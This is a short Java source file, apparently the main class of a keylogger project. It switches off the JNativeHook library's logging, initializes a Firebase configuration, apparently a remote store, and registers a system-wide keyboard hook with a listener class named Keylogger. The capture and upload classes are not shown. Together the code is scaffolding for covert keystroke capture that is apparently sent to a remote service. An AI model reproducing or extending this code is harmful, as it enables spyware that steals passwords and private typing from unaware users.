package com.key;

import java.util.logging.Level;
import java.util.logging.Logger;

import com.github.kwhat.jnativehook.GlobalScreen;

public class Main {
    public static void main(String[] args) {
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);

        FirebaseConfig.initialize();

        try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new Keylogger());
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
